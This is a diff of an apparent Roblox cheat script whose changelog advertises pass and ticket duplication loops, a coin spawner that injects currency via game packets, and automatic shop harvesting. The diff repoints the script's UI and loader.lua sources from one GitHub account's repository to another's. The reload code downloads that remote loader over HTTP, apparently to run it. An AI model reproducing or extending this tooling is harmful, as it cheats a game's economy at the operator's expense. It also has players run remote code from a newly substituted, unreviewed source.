@@ -1,4 +1,4 @@
-if not game:IsLoaded() then
+﻿if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
@@ -155,7 +155,7 @@ xDTaraZ.Config = {
         { "2026-10-20", "Rejoin Pass & Ticket Dupe Loop Engine\n• Auto Rejoin Season Loop: Persistent server-hop & rejoin cycle without script drop\n• Instant Pass & Shop Harvester: Auto-claims Season Pass milestones and exchanges 800 SC Tickets, 1,000 SC Race Rolls & 1,500 SC Protect Scrolls\n• Stock Quota Sweeper: Restock mode sweeps full store quota on every join\n• Rapid Coin Spawner: Instant 200,000 SC top-up integration via Tower packets\n• Live Teleport Watchdog: Resilient auto-retry on server full or teleport failure" },
     },
     RejoinSeasonFlag = "rejoin_season.json",
-    UiSource = "https://raw.githubusercontent.com/xDTaraZz/Roblox-Scripts/refs/heads/main/ui.lua",
+    UiSource = "https://raw.githubusercontent.com/nolvikae/NolviHUB/refs/heads/main/ui.lua",
     ReloadSource = [[
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(1.5)
@@ -172,7 +172,7 @@ if isfile and readfile then
     end
 end
 if not loaded then
-    local url = "https://raw.githubusercontent.com/xDTaraZz/Roblox-Scripts/refs/heads/main/loader.lua"
+    local url = "https://raw.githubusercontent.com/nolvikae/NolviHUB/refs/heads/main/loader.lua"
     local ok, body = pcall(game.HttpGet, game, url)
     if not (ok and type(body) == "string") then
         local requester = request or http_request or (syn and syn.request) or (http and http.request)
